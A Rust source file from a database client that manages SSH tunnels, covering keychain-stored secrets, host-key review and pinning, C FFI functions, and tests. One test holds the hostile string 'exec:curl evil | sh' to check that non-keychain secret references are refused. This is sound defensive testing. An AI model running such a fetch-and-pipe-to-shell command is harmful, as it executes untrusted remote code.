use std::ffi::c_char;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

use datagrep_api::{ConfigValue, ConnectionConfig, SecretString};
use datagrep_profiles::{Profile, Tunnel, TunnelAuth};
use datagrep_secrets::SecretRef;
use datagrep_tunnel::{
    fingerprint, probe_host_key, Auth, Connector, HostKeyStatus, LocalForward, SshTunnel,
    TofuStore, TunnelError,
};
use serde::Deserialize;
use serde_json::json;

use crate::core::{core_ref, CoreInner, DatagrepCore};
use crate::ffi_util::{cstr, guard, to_c_string};
use crate::runtime::runtime;

const SSH_TIMEOUT: Duration = Duration::from_secs(15);

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
pub(crate) struct SshPatch {
    host: String,
    #[serde(default = "default_port")]
    port: u16,
    user: String,
    #[serde(default)]
    auth: Option<String>,
    #[serde(default)]
    key_path: Option<String>,
    #[serde(default)]
    secret: Option<String>,
}

fn default_port() -> u16 {
    22
}

impl SshPatch {
    fn validated(&self) -> Result<(String, String, TunnelAuth, Option<String>), String> {
        let host = self.host.trim().to_string();
        let user = self.user.trim().to_string();
        if host.is_empty() || user.is_empty() {
            return Err("an SSH tunnel needs a host and a user".to_string());
        }
        let auth = match self.auth.as_deref() {
            None => TunnelAuth::Agent,
            Some(name) => TunnelAuth::parse(name).ok_or_else(|| {
                format!("unknown SSH auth `{name}`; expected agent, key or password")
            })?,
        };
        let key_path = self
            .key_path
            .as_deref()
            .map(str::trim)
            .filter(|p| !p.is_empty())
            .map(str::to_string);
        if auth == TunnelAuth::Key && key_path.is_none() {
            return Err("SSH key authentication needs a key file".to_string());
        }
        Ok((host, user, auth, key_path))
    }

    fn typed_secret(&self) -> Option<SecretString> {
        self.secret
            .as_ref()
            .filter(|s| !s.is_empty())
            .map(|s| SecretString::new(s.clone()))
    }
}

pub(crate) struct TunnelSpec {
    host: String,
    port: u16,
    user: String,
    auth: TunnelAuth,
    key_path: Option<String>,
    secret: Option<SecretString>,
}

impl TunnelSpec {
    fn checked(self) -> Result<Self, String> {
        if self.auth == TunnelAuth::Password && self.secret.is_none() {
            return Err(format!(
                "no SSH password is saved for {}@{}; enter it in the connection settings",
                self.user, self.host
            ));
        }
        Ok(self)
    }

    fn credential(&self) -> Auth {
        let secret = || {
            self.secret
                .as_ref()
                .map(|s| SecretString::new(s.expose().into()))
        };
        match self.auth {
            TunnelAuth::Agent => Auth::Agent,
            TunnelAuth::Key => Auth::KeyFile {
                path: expand_home(self.key_path.as_deref().unwrap_or_default()),
                passphrase: secret(),
            },
            TunnelAuth::Password => {
                Auth::Password(secret().unwrap_or_else(|| SecretString::new(String::new())))
            }
        }
    }
}

fn expand_home(path: &str) -> PathBuf {
    let home = std::env::var_os("HOME").filter(|h| !h.is_empty());
    match (path.strip_prefix("~/"), home) {
        (Some(rest), Some(home)) => PathBuf::from(home).join(rest),
        _ => path.into(),
    }
}

fn secret_ref_for(profile_id: &str) -> SecretRef {
    SecretRef::Keychain {
        service: "datagrep".to_string(),
        account: format!("{profile_id}:ssh_secret"),
    }
}

// Only refs this code wrote are honoured: a tunnel imported from a shared bundle must not run `exec:`.
fn keychain_ref(text: &str) -> Result<SecretRef, String> {
    match text.parse::<SecretRef>() {
        Ok(reference @ SecretRef::Keychain { .. }) => Ok(reference),
        Ok(other) => Err(format!(
            "the SSH secret reference uses `{}:`, which tunnels do not accept; re-enter the secret in the connection settings",
            other.scheme()
        )),
        Err(e) => Err(e.to_string()),
    }
}

async fn forget_secret(core: &CoreInner, secret_ref: Option<&str>) {
    if let Some(Ok(reference)) = secret_ref.map(keychain_ref) {
        let _ = core.secrets.delete(&reference).await;
    }
}

/// Persists `patch` as the profile's tunnel (`None` removes it); call before the profile row is written.
pub(crate) async fn apply(
    core: &CoreInner,
    profile: &mut Profile,
    patch: Option<SshPatch>,
) -> Result<(), String> {
    let existing = match &profile.tunnel_id {
        Some(id) => core
            .store
            .get_tunnel(id.clone())
            .await
            .map_err(|e| format!("could not read the SSH tunnel: {e}"))?,
        None => None,
    };
    let Some(patch) = patch else {
        if let Some(old) = existing {
            forget_secret(core, old.secret_ref.as_deref()).await;
            core.store
                .delete_tunnel(old.id)
                .await
                .map_err(|e| format!("could not remove the SSH tunnel: {e}"))?;
        }
        profile.tunnel_id = None;
        return Ok(());
    };

    let (host, user, auth, key_path) = patch.validated()?;
    target(&profile.config)?;
    let kept = existing
        .as_ref()
        .filter(|old| old.auth == auth && auth != TunnelAuth::Agent)
        .and_then(|old| old.secret_ref.clone());
    let secret_ref = match patch.typed_secret() {
        Some(_) if auth == TunnelAuth::Agent => None,
        Some(secret) => {
            let reference = secret_ref_for(&profile.id);
            core.secrets
                .store(&reference, secret)
                .await
                .map_err(|e| format!("could not store the SSH secret in the keychain: {e}"))?;
            Some(reference.to_string())
        }
        None => kept,
    };
    if let Some(old) = &existing {
        if old.secret_ref.is_some() && secret_ref.is_none() {
            forget_secret(core, old.secret_ref.as_deref()).await;
        }
    }

    let now = datagrep_profiles::now_ms();
    let tunnel = Tunnel {
        id: existing
            .as_ref()
            .map(|t| t.id.clone())
            .unwrap_or_else(datagrep_profiles::new_id),
        name: profile.name.clone(),
        host,
        port: patch.port,
        username: user,
        auth,
        key_path,
        secret_ref,
        known_hosts_pin: None,
        created_at: existing.as_ref().map(|t| t.created_at).unwrap_or(now),
        updated_at: now,
    };
    let id = tunnel.id.clone();
    let saved = if existing.is_some() {
        core.store.update_tunnel(tunnel).await
    } else {
        core.store.create_tunnel(tunnel).await
    };
    saved.map_err(|e| format!("could not save the SSH tunnel: {e}"))?;
    profile.tunnel_id = Some(id);
    Ok(())
}

pub(crate) async fn remove(core: &CoreInner, tunnel_id: Option<String>) {
    let Some(id) = tunnel_id else { return };
    if let Ok(Some(tunnel)) = core.store.get_tunnel(id.clone()).await {
        forget_secret(core, tunnel.secret_ref.as_deref()).await;
    }
    let _ = core.store.delete_tunnel(id).await;
}

pub(crate) async fn saved_tunnel(
    core: &CoreInner,
    profile: &Profile,
) -> Result<Option<Tunnel>, String> {
    let Some(id) = &profile.tunnel_id else {
        return Ok(None);
    };
    core.store
        .get_tunnel(id.clone())
        .await
        .map_err(|e| format!("could not read the SSH tunnel: {e}"))
}

async fn resolve_secret(
    core: &CoreInner,
    secret_ref: Option<&str>,
) -> Result<Option<SecretString>, String> {
    let Some(text) = secret_ref else {
        return Ok(None);
    };
    let reference = keychain_ref(text)?;
    core.secrets
        .resolve(&reference)
        .await
        .map(Some)
        .map_err(|e| format!("could not read the SSH secret from the keychain: {e}"))
}

pub(crate) async fn spec_for(
    core: &CoreInner,
    saved: Option<&Tunnel>,
    draft: Option<Option<SshPatch>>,
) -> Result<Option<TunnelSpec>, String> {
    let draft = match draft {
        None => {
            let Some(t) = saved else { return Ok(None) };
            let spec = TunnelSpec {
                host: t.host.clone(),
                port: t.port,
                user: t.username.clone(),
                auth: t.auth,
                key_path: t.key_path.clone(),
                secret: resolve_secret(core, t.secret_ref.as_deref()).await?,
            };
            return spec.checked().map(Some);
        }
        Some(None) => return Ok(None),
        Some(Some(draft)) => draft,
    };
    let (host, user, auth, key_path) = draft.validated()?;
    let secret = match draft.typed_secret() {
        Some(secret) => Some(secret),
        None => match saved.filter(|t| t.auth == auth) {
            Some(t) => resolve_secret(core, t.secret_ref.as_deref()).await?,
            None => None,
        },
    };
    let spec = TunnelSpec {
        host,
        port: draft.port,
        user,
        auth,
        key_path,
        secret,
    };
    spec.checked().map(Some)
}

fn num(value: &ConfigValue) -> Option<u16> {
    match value {
        ConfigValue::Num(n) => Some(*n as u16),
        ConfigValue::Str(s) => s.parse().ok(),
        ConfigValue::Bool(_) => None,
    }
}

fn str_value<'a>(config: &'a ConnectionConfig, key: &str) -> Option<&'a str> {
    match config.values.get(key) {
        Some(ConfigValue::Str(s)) if !s.is_empty() => Some(s),
        _ => None,
    }
}

// The far end the tunnel must reach, read from the engine's own config.
fn target(config: &ConnectionConfig) -> Result<(String, u16), String> {
    if let Some(hosts) = str_value(config, "hosts") {
        if matches!(config.values.get("srv"), Some(ConfigValue::Bool(true))) {
            return Err(
                "an SSH tunnel cannot carry a mongodb+srv:// seed list; use one host:port"
                    .to_string(),
            );
        }
        if hosts.contains(',') {
            return Err("an SSH tunnel reaches one host; list a single host:port".to_string());
        }
        let (host, port) = match hosts.strip_prefix('[') {
            Some(v6) => v6
                .split_once(']')
                .map(|(h, tail)| (h, tail.strip_prefix(':')))
                .ok_or_else(|| format!("`{hosts}` is not a host:port"))?,
            None => match hosts.rsplit_once(':') {
                Some((h, p)) => (h, Some(p)),
                None => (hosts, None),
            },
        };
        let port = match port {
            Some(p) => p
                .parse()
                .map_err(|_| format!("`{hosts}` does not end in a port"))?,
            None => 27017,
        };
        return Ok((host.to_string(), port));
    }
    let host = str_value(config, "host").ok_or_else(|| {
        format!(
            "an SSH tunnel carries a network connection; `{}` has no host to reach",
            config.driver
        )
    })?;
    let port = config
        .values
        .get("port")
        .and_then(num)
        .or_else(|| default_port_for(&config.driver))
        .ok_or_else(|| format!("`{}` needs a port to tunnel to", config.driver))?;
    Ok((host.to_string(), port))
}

fn default_port_for(driver: &str) -> Option<u16> {
    let driver = crate::drivers::driver_for(driver)?;
    driver
        .config_schema()
        .fields
        .iter()
        .find(|f| f.key.as_ref() == "port")
        .and_then(|f| f.default.as_ref())
        .and_then(num)
}

fn point_at(config: &mut ConnectionConfig, port: u16) {
    if config.values.contains_key("hosts") {
        config.values.insert(
            "hosts".to_string(),
            ConfigValue::Str(format!("127.0.0.1:{port}")),
        );
        // Without it the driver follows the replica set's advertised hosts around the tunnel.
        let extra = match str_value(config, "extra_options") {
            Some(extra) => format!("{extra}&directConnection=true"),
            None => "directConnection=true".to_string(),
        };
        config
            .values
            .insert("extra_options".to_string(), ConfigValue::Str(extra));
        return;
    }
    config.values.insert(
        "host".to_string(),
        ConfigValue::Str("127.0.0.1".to_string()),
    );
    config
        .values
        .insert("port".to_string(), ConfigValue::Num(f64::from(port)));
}

fn connector(core: &CoreInner, spec: TunnelSpec) -> Connector<TofuStore> {
    let spec = Arc::new(spec);
    let known_hosts = core.known_hosts.clone();
    let system = core.system_known_hosts.clone();
    Arc::new(move || {
        let spec = spec.clone();
        let known_hosts = known_hosts.clone();
        let system = system.clone();
        Box::pin(async move {
            let store = TofuStore::open_unattended(known_hosts, system).await?;
            let connect = SshTunnel::connect(
                spec.host.clone(),
                spec.port,
                spec.user.clone(),
                spec.credential(),
                Arc::new(store),
            );
            tokio::time::timeout(SSH_TIMEOUT, connect)
                .await
                .map_err(|_| TunnelError::Timeout {
                    host: spec.host.clone(),
                    port: spec.port,
                })?
        })
    })
}

/// Opens the tunnel and rewrites `config` to dial its loopback end; the forward must outlive every connection made from it.
pub(crate) async fn route(
    core: &CoreInner,
    spec: TunnelSpec,
    config: &mut ConnectionConfig,
) -> Result<LocalForward, String> {
    let (host, port) = target(config)?;
    let forward = LocalForward::start(connector(core, spec), host, port)
        .await
        .map_err(|e| e.to_string())?;
    point_at(config, forward.local_addr().port());
    Ok(forward)
}

pub(crate) fn tunnel_json(tunnel: &Tunnel) -> serde_json::Value {
    json!({
        "host": tunnel.host,
        "port": tunnel.port,
        "user": tunnel.username,
        "auth": tunnel.auth.as_str(),
        "key_path": tunnel.key_path,
        "has_secret": tunnel.secret_ref.is_some(),
    })
}

async fn host_key_store(core: &CoreInner) -> Result<TofuStore, String> {
    TofuStore::open_unattended(core.known_hosts.clone(), core.system_known_hosts.clone())
        .await
        .map_err(|e| e.to_string())
}

async fn review_host_key(
    core: &CoreInner,
    host: &str,
    port: u16,
) -> Result<serde_json::Value, String> {
    let key = tokio::time::timeout(SSH_TIMEOUT, probe_host_key(host, port))
        .await
        .map_err(|_| format!("SSH connection to {host}:{port} timed out"))?
        .map_err(|e| e.to_string())?;
    let status = host_key_store(core).await?.status(host, port, &key).await;
    let status = status.map_err(|e| e.to_string())?;
    let (label, expected) = match &status {
        HostKeyStatus::Trusted => ("trusted", None),
        HostKeyStatus::Unknown => ("unknown", None),
        HostKeyStatus::Changed {
            expected_fingerprint,
        } => ("changed", Some(expected_fingerprint.clone())),
    };
    let payload = json!({
        "host": host,
        "port": port,
        "algorithm": key.algorithm().as_str(),
        "fingerprint": fingerprint(&key),
        "status": label,
        "expected": expected,
        "known_hosts": core.known_hosts.display().to_string(),
    });
    core.lock_pending_host_keys()
        .insert((host.to_string(), port), key);
    Ok(payload)
}

async fn trust_host_key(
    core: &CoreInner,
    host: &str,
    port: u16,
    shown: &str,
) -> Result<(), String> {
    let key = core
        .lock_pending_host_keys()
        .get(&(host.to_string(), port))
        .cloned()
        .ok_or_else(|| format!("review the host key of {host}:{port} before trusting it"))?;
    if fingerprint(&key) != shown {
        return Err(format!(
            "{host}:{port} offered a different key than the one reviewed; review it again"
        ));
    }
    let store = host_key_store(core).await?;
    match store
        .status(host, port, &key)
        .await
        .map_err(|e| e.to_string())?
    {
        HostKeyStatus::Trusted => {}
        HostKeyStatus::Changed { .. } => {
            return Err(format!(
                "{host}:{port} already has a different trusted key; if the change is expected, remove its line from {} and review again",
                store.path().display()
            ))
        }
        HostKeyStatus::Unknown => store
            .pin(host, port, &key)
            .await
            .map_err(|e| e.to_string())?,
    }
    core.lock_pending_host_keys()
        .remove(&(host.to_string(), port));
    Ok(())
}

/// # Safety
/// `core` is a live handle from `datagrep_core_new`; `host` is NUL-terminated; `err_out` is NULL or a writable slot.
#[no_mangle]
pub unsafe extern "C" fn datagrep_ssh_host_key_json(
    core: *mut DatagrepCore,
    host: *const c_char,
    port: u16,
    err_out: *mut *mut c_char,
) -> *mut c_char {
    guard(
        err_out,
        std::ptr::null_mut(),
        "datagrep_ssh_host_key_json",
        || {
            // SAFETY: live DatagrepCore* and NUL-terminated strings per the module contract.
            let core = unsafe { core_ref(core) }?;
            let host = unsafe { cstr(host, "host") }?.trim();
            if host.is_empty() {
                return Err("host must not be empty".to_string());
            }
            let rt = runtime()?;
            let payload = rt.block_on(review_host_key(core, host, port))?;
            Ok(to_c_string(payload.to_string()))
        },
    )
}

/// # Safety
/// `core` is a live handle from `datagrep_core_new`; string arguments are NUL-terminated; `err_out` is NULL or a writable slot.
#[no_mangle]
pub unsafe extern "C" fn datagrep_ssh_trust_host_key(
    core: *mut DatagrepCore,
    host: *const c_char,
    port: u16,
    fingerprint: *const c_char,
    err_out: *mut *mut c_char,
) -> bool {
    guard(err_out, false, "datagrep_ssh_trust_host_key", || {
        // SAFETY: live DatagrepCore* and NUL-terminated strings per the module contract.
        let core = unsafe { core_ref(core) }?;
        let host = unsafe { cstr(host, "host") }?.trim();
        let shown = unsafe { cstr(fingerprint, "fingerprint") }?;
        let rt = runtime()?;
        rt.block_on(trust_host_key(core, host, port, shown))?;
        Ok(true)
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;

    fn config(driver: &str, values: &[(&str, ConfigValue)]) -> ConnectionConfig {
        ConnectionConfig {
            driver: Arc::from(driver),
            values: values
                .iter()
                .map(|(k, v)| (k.to_string(), v.clone()))
                .collect::<BTreeMap<_, _>>(),
        }
    }

    #[test]
    fn host_and_port_engines_are_pointed_at_the_loopback_end() {
        let mut c = config(
            "postgres",
            &[
                ("host", ConfigValue::Str("db.internal".into())),
                ("port", ConfigValue::Num(6543.0)),
            ],
        );
        assert_eq!(target(&c).unwrap(), ("db.internal".to_string(), 6543));
        point_at(&mut c, 40001);
        assert_eq!(c.values["host"], ConfigValue::Str("127.0.0.1".into()));
        assert_eq!(c.values["port"], ConfigValue::Num(40001.0));
    }

    #[test]
    fn a_missing_port_falls_back_to_the_engine_default() {
        let c = config("mysql", &[("host", ConfigValue::Str("db".into()))]);
        assert_eq!(target(&c).unwrap(), ("db".to_string(), 3306));
    }

    #[test]
    fn mongo_goes_direct_to_one_host() {
        let mut c = config(
            "mongodb",
            &[
                ("hosts", ConfigValue::Str("mongo.internal:27018".into())),
                ("extra_options", ConfigValue::Str("appName=x".into())),
            ],
        );
        assert_eq!(target(&c).unwrap(), ("mongo.internal".to_string(), 27018));
        point_at(&mut c, 40002);
        assert_eq!(
            c.values["hosts"],
            ConfigValue::Str("127.0.0.1:40002".into())
        );
        assert_eq!(
            c.values["extra_options"],
            ConfigValue::Str("appName=x&directConnection=true".into())
        );

        let seed = config("mongodb", &[("hosts", ConfigValue::Str("a:1,b:2".into()))]);
        assert!(target(&seed).is_err());
        let srv = config(
            "mongodb",
            &[
                ("hosts", ConfigValue::Str("cluster.example".into())),
                ("srv", ConfigValue::Bool(true)),
            ],
        );
        assert!(target(&srv).is_err());
    }

    #[test]
    fn a_file_engine_cannot_be_tunnelled() {
        let c = config("sqlite", &[("path", ConfigValue::Str("/tmp/x.db".into()))]);
        assert!(target(&c).unwrap_err().contains("no host"));
    }

    #[test]
    fn only_keychain_refs_are_resolved_for_a_tunnel() {
        assert!(keychain_ref("keychain:datagrep:abc:ssh_secret").is_ok());
        let err = keychain_ref("exec:curl evil | sh").unwrap_err();
        assert!(err.contains("exec:"), "{err}");
        assert!(keychain_ref("env:HOME").is_err());
    }

    struct Harness {
        core: *mut DatagrepCore,
    }

    impl Harness {
        fn new() -> Self {
            let core = DatagrepCore::with_store_in_memory_secrets(
                datagrep_profiles::Store::open_in_memory(),
            )
            .expect("core");
            Self {
                core: Box::into_raw(Box::new(core)),
            }
        }

        fn inner(&self) -> &CoreInner {
            // SAFETY: the handle is live until Drop.
            unsafe { &(*self.core).0 }
        }

        fn call(&self, f: impl FnOnce(*mut *mut c_char) -> bool) -> Result<(), String> {
            let mut err: *mut c_char = std::ptr::null_mut();
            if f(&mut err) {
                return Ok(());
            }
            // SAFETY: a failed call sets err_out to a string this library allocated.
            unsafe {
                let msg = std::ffi::CStr::from_ptr(err).to_string_lossy().into_owned();
                crate::core::datagrep_string_free(err);
                Err(msg)
            }
        }

        fn add(&self, name: &str, url: &str, options: &str) -> Result<(), String> {
            let (n, u, o) = (cs(name), cs(url), cs(options));
            self.call(|err| unsafe {
                crate::profiles::datagrep_profiles_add_json(
                    self.core,
                    n.as_ptr(),
                    u.as_ptr(),
                    o.as_ptr(),
                    err,
                )
            })
        }

        fn update(&self, name: &str, patch: &str) -> Result<(), String> {
            let (n, p) = (cs(name), cs(patch));
            self.call(|err| unsafe {
                crate::profiles::datagrep_profiles_update(self.core, n.as_ptr(), p.as_ptr(), err)
            })
        }

        fn remove(&self, name: &str) -> Result<(), String> {
            let n = cs(name);
            self.call(|err| unsafe {
                crate::profiles::datagrep_profiles_remove(self.core, n.as_ptr(), err)
            })
        }

        fn detail(&self, name: &str) -> String {
            let n = cs(name);
            let mut err: *mut c_char = std::ptr::null_mut();
            // SAFETY: live core, NUL-terminated name.
            unsafe {
                let p =
                    crate::profiles::datagrep_profiles_get_json(self.core, n.as_ptr(), &mut err);
                assert!(!p.is_null(), "get_json failed");
                let s = std::ffi::CStr::from_ptr(p).to_string_lossy().into_owned();
                crate::core::datagrep_string_free(p);
                s
            }
        }

        fn block<T>(&self, f: impl std::future::Future<Output = T>) -> T {
            runtime().expect("runtime").block_on(f)
        }

        fn tunnels(&self) -> Vec<Tunnel> {
            self.block(self.inner().store.list_tunnels()).unwrap()
        }

        fn secret(&self, reference: &str) -> Option<String> {
            let reference: SecretRef = reference.parse().unwrap();
            self.block(self.inner().secrets.resolve(&reference))
                .ok()
                .map(|s| s.expose().to_string())
        }
    }

    impl Drop for Harness {
        fn drop(&mut self) {
            // SAFETY: allocated by Box::into_raw in new and freed exactly once.
            unsafe { crate::core::datagrep_core_free(self.core) };
        }
    }

    fn cs(s: &str) -> std::ffi::CString {
        std::ffi::CString::new(s).unwrap()
    }

    #[test]
    fn ssh_settings_round_trip_and_the_secret_lives_only_in_the_keychain() {
        let h = Harness::new();
        h.add(
            "prod",
            "postgres://app@10.0.0.5:5432/main",
            r#"{"ssh":{"host":"bastion.example","port":2222,"user":"deploy","auth":"password","secret":"s3cret-ssh"}}"#,
        )
        .unwrap();

        let detail = h.detail("prod");
        assert!(!detail.contains("s3cret-ssh"), "{detail}");
        let detail: serde_json::Value = serde_json::from_str(&detail).unwrap();
        assert_eq!(detail["ssh"]["host"], "bastion.example");
        assert_eq!(detail["ssh"]["port"], 2222);
        assert_eq!(detail["ssh"]["auth"], "password");
        assert_eq!(detail["ssh"]["has_secret"], true);

        let tunnel = h.tunnels().pop().expect("tunnel row");
        let reference = tunnel.secret_ref.clone().expect("secret ref");
        assert!(reference.starts_with("keychain:datagrep:"), "{reference}");
        assert_eq!(h.secret(&reference).as_deref(), Some("s3cret-ssh"));
        let bundle = h.block(h.inner().store.export_profiles()).unwrap();
        assert!(!bundle.contains("s3cret-ssh"));

        // No secret typed and the method unchanged: the saved one stays.
        h.update(
            "prod",
            r#"{"ssh":{"host":"bastion.example","port":22,"user":"deploy","auth":"password"}}"#,
        )
        .unwrap();
        assert_eq!(h.secret(&reference).as_deref(), Some("s3cret-ssh"));
        assert_eq!(h.tunnels()[0].port, 22);

        // Switching to the agent drops the password from the keychain.
        h.update(
            "prod",
            r#"{"ssh":{"host":"bastion.example","user":"deploy","auth":"agent"}}"#,
        )
        .unwrap();
        assert_eq!(h.secret(&reference), None);
        assert_eq!(h.tunnels()[0].secret_ref, None);

        h.update("prod", r#"{"ssh":null}"#).unwrap();
        assert!(h.tunnels().is_empty());
        let detail: serde_json::Value = serde_json::from_str(&h.detail("prod")).unwrap();
        assert!(detail["ssh"].is_null());
    }

    #[test]
    fn removing_the_profile_removes_its_tunnel_and_secret() {
        let h = Harness::new();
        h.add(
            "via-key",
            "mysql://root@db.internal/app",
            r#"{"ssh":{"host":"jump","user":"me","auth":"key","key_path":"~/.ssh/id_ed25519","secret":"phrase"}}"#,
        )
        .unwrap();
        let reference = h.tunnels()[0].secret_ref.clone().unwrap();
        h.remove("via-key").unwrap();
        assert!(h.tunnels().is_empty());
        assert_eq!(h.secret(&reference), None);
    }

    #[test]
    fn invalid_tunnels_are_refused_before_anything_is_saved() {
        let h = Harness::new();
        let err = h
            .add("file", ":memory:", r#"{"ssh":{"host":"jump","user":"me"}}"#)
            .unwrap_err();
        assert!(err.contains("no host"), "{err}");
        let err = h
            .add(
                "nokey",
                "postgres://a@db/x",
                r#"{"ssh":{"host":"jump","user":"me","auth":"key"}}"#,
            )
            .unwrap_err();
        assert!(err.contains("key file"), "{err}");
        assert!(h.tunnels().is_empty());
        assert!(h
            .block(h.inner().store.list_profiles(None))
            .unwrap()
            .is_empty());
    }

    #[test]
    fn a_tunnel_without_its_password_says_so_instead_of_dialing() {
        let h = Harness::new();
        h.add(
            "pw",
            "postgres://a@db/x",
            r#"{"ssh":{"host":"127.0.0.1","port":1,"user":"me","auth":"password"}}"#,
        )
        .unwrap();
        let err = h.block(h.inner().open_profile("pw")).unwrap_err();
        assert!(err.contains("no SSH password is saved"), "{err}");
    }

    #[test]
    fn trusting_needs_a_reviewed_key() {
        let h = Harness::new();
        let err = h
            .block(trust_host_key(h.inner(), "never-seen", 22, "SHA256:x"))
            .unwrap_err();
        assert!(err.contains("review the host key"), "{err}");
    }

    // Live: DATAGREP_SSH_TEST_{HOST,PORT,USER,PASSWORD,KEYFILE,KEYFILE_PASSPHRASE,DB_URL}; DB_URL is as seen from the SSH host.
    fn live(name: &str) -> String {
        std::env::var(format!("DATAGREP_SSH_TEST_{name}"))
            .unwrap_or_else(|_| panic!("set DATAGREP_SSH_TEST_{name}"))
    }

    fn live_ssh(auth: &str, secret: Option<String>) -> String {
        let mut ssh = json!({
            "host": live("HOST"),
            "port": live("PORT").parse::<u16>().unwrap(),
            "user": live("USER"),
            "auth": auth,
        });
        if auth == "key" {
            ssh["key_path"] = json!(live("KEYFILE"));
        }
        if let Some(secret) = secret {
            ssh["secret"] = json!(secret);
        }
        json!({ "ssh": ssh }).to_string()
    }

    impl Harness {
        fn review(&self) -> serde_json::Value {
            let port: u16 = live("PORT").parse().unwrap();
            self.block(review_host_key(self.inner(), &live("HOST"), port))
                .expect("review")
        }

        fn trust_reviewed(&self) {
            let review = self.review();
            assert_eq!(review["status"], "unknown", "{review}");
            let fp = review["fingerprint"].as_str().unwrap().to_string();
            let port: u16 = live("PORT").parse().unwrap();
            self.block(trust_host_key(self.inner(), &live("HOST"), port, &fp))
                .expect("trust");
            assert_eq!(self.review()["status"], "trusted");
        }

        fn select_one(&self, profile: &str) -> String {
            let (n, sql) = (cs(profile), cs("select 40 + 2 as answer"));
            let mut err: *mut c_char = std::ptr::null_mut();
            // SAFETY: live core and NUL-terminated strings; the query handle is freed below.
            unsafe {
                let q =
                    crate::query::datagrep_query_run(self.core, n.as_ptr(), sql.as_ptr(), &mut err);
                assert!(!q.is_null(), "query_run failed");
                for _ in 0..1500 {
                    let mut err: *mut c_char = std::ptr::null_mut();
                    let p = crate::query::datagrep_query_status_json(q, &mut err);
                    let status = std::ffi::CStr::from_ptr(p).to_string_lossy().into_owned();
                    crate::core::datagrep_string_free(p);
                    if ["done", "failed", "capped", "cancelled"]
                        .iter()
                        .any(|t| status.contains(&format!("\"state\":\"{t}\"")))
                    {
                        crate::query::datagrep_query_free(q);
                        return status;
                    }
                    std::thread::sleep(Duration::from_millis(10));
                }
                panic!("query never finished");
            }
        }

        fn test_saved(&self, profile: &str) -> Result<serde_json::Value, String> {
            self.block(crate::profiles::test_connection(
                self.inner(),
                profile,
                "",
                None,
            ))
        }
    }

    #[test]
    #[ignore = "needs a real sshd in front of postgres; see live()"]
    fn live_password_tunnel_runs_a_query_after_the_key_is_reviewed() {
        let h = Harness::new();
        h.add(
            "pg",
            &live("DB_URL"),
            &live_ssh("password", Some(live("PASSWORD"))),
        )
        .unwrap();

        let err = h.test_saved("pg").unwrap_err();
        assert!(err.contains("not trusted yet"), "{err}");

        h.trust_reviewed();
        let ok = h.test_saved("pg").unwrap();
        assert_eq!(ok["product"], "PostgreSQL", "{ok}");
        let status = h.select_one("pg");
        assert!(status.contains("\"state\":\"done\""), "{status}");
    }

    #[test]
    #[ignore = "needs a real sshd in front of postgres; see live()"]
    fn live_key_file_with_passphrase() {
        let h = Harness::new();
        h.add(
            "pg",
            &live("DB_URL"),
            &live_ssh("key", Some(live("KEYFILE_PASSPHRASE"))),
        )
        .unwrap();
        h.trust_reviewed();
        assert_eq!(h.test_saved("pg").unwrap()["product"], "PostgreSQL");

        h.update("pg", &live_ssh("key", Some("wrong-phrase".into())))
            .unwrap();
        let err = h.test_saved("pg").unwrap_err();
        assert!(err.contains("could not load key file"), "{err}");
    }

    #[test]
    #[ignore = "needs a real sshd in front of postgres and SSH_AUTH_SOCK holding an accepted key"]
    fn live_agent_auth() {
        let h = Harness::new();
        h.add("pg", &live("DB_URL"), &live_ssh("agent", None))
            .unwrap();
        h.trust_reviewed();
        assert_eq!(h.test_saved("pg").unwrap()["product"], "PostgreSQL");
    }

    #[test]
    #[ignore = "needs a real sshd in front of postgres; see live()"]
    fn live_a_wrong_password_is_an_auth_failure() {
        let h = Harness::new();
        h.add(
            "pg",
            &live("DB_URL"),
            &live_ssh("password", Some("not-it".into())),
        )
        .unwrap();
        h.trust_reviewed();
        let err = h.test_saved("pg").unwrap_err();
        assert!(err.contains("authentication"), "{err}");
    }

    #[test]
    #[ignore = "needs a real sshd in front of postgres; see live()"]
    fn live_a_changed_host_key_is_refused_and_cannot_be_trusted_over() {
        let h = Harness::new();
        let (host, port) = (live("HOST"), live("PORT").parse::<u16>().unwrap());
        let impostor = datagrep_tunnel::PublicKey::from_openssh(
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKsDzHtaiI1omYo/DkchNpnOQStfPXYZBi/N82zxsxSA",
        )
        .unwrap();
        h.block(async {
            let store = host_key_store(h.inner()).await.unwrap();
            store.pin(&host, port, &impostor).await.unwrap();
        });
        h.add(
            "pg",
            &live("DB_URL"),
            &live_ssh("password", Some(live("PASSWORD"))),
        )
        .unwrap();

        let err = h.test_saved("pg").unwrap_err();
        assert!(err.contains("HOST KEY CHANGED"), "{err}");
        let err = h.block(h.inner().open_profile("pg")).unwrap_err();
        assert!(err.contains("HOST KEY CHANGED"), "{err}");

        let review = h.review();
        assert_eq!(review["status"], "changed", "{review}");
        let fp = review["fingerprint"].as_str().unwrap().to_string();
        let err = h
            .block(trust_host_key(h.inner(), &host, port, &fp))
            .unwrap_err();
        assert!(err.contains("different trusted key"), "{err}");
    }

    #[derive(Clone, Default)]
    struct CapturedLog(Arc<std::sync::Mutex<Vec<u8>>>);

    impl std::io::Write for CapturedLog {
        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
            self.0.lock().unwrap().extend_from_slice(buf);
            Ok(buf.len())
        }
        fn flush(&mut self) -> std::io::Result<()> {
            Ok(())
        }
    }

    impl<'a> tracing_subscriber::fmt::MakeWriter<'a> for CapturedLog {
        type Writer = Self;
        fn make_writer(&'a self) -> Self::Writer {
            self.clone()
        }
    }

    // Process-wide: tunnel work runs on the shared runtime's worker threads.
    fn captured_log() -> &'static CapturedLog {
        static LOG: std::sync::OnceLock<CapturedLog> = std::sync::OnceLock::new();
        LOG.get_or_init(|| {
            let log = CapturedLog::default();
            tracing_subscriber::fmt()
                .with_writer(log.clone())
                .with_max_level(tracing::Level::TRACE)
                .with_ansi(false)
                .try_init()
                .expect("no other global subscriber in this test binary");
            log
        })
    }

    fn assert_never_logged(canaries: &[&str], errors: &[String]) {
        let text = String::from_utf8_lossy(&captured_log().0.lock().unwrap()).into_owned();
        assert!(!text.is_empty(), "the subscriber captured nothing");
        for canary in canaries {
            assert!(!text.contains(canary), "a secret reached the log");
            for e in errors {
                assert!(!e.contains(canary), "a secret reached an error: {e}");
            }
        }
    }

    #[test]
    fn no_ssh_secret_is_logged_or_echoed_at_trace() {
        captured_log();
